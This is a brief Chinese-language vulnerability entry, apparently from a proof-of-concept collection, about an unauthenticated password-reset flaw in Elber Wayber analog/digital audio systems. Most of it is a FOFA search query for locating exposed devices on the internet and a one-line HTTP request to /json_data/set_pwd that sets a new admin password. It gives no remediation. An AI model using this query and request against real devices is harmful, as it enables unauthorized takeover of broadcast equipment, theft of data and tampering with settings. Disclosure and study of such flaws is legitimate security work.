# Elber-Wayber模拟数字音频密码重置漏洞

**Elber wavber 模拟/数字音频系统,存在一个严重的 安全漏洞只，该漏洞位于系统的密码重置功能中。攻击者可以通过利用此漏洞。绕过正常的身份验证流程，直接重置用户密码，从而非法获取系统访问权限。一旦攻击者成功重置密码，他们可以登录系统并完全接管控制权，进而窃取敏感数据、篡改系统设置或进行其他恶意操作。** 

## fofa

```javascript
title="Elber Satellite Equipment" || body="www.elber.it"
```

## poc

```javascript
GET /json_data/set_pwd?lev=2&pass=admin1234 HTTP/1.1
Content-Type: application/json
Host: 
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502131416179.webp)

## 漏洞来源

- https://mp.weixin.qq.com/s/GnuI11tY3AHG9jEh3J4aDQ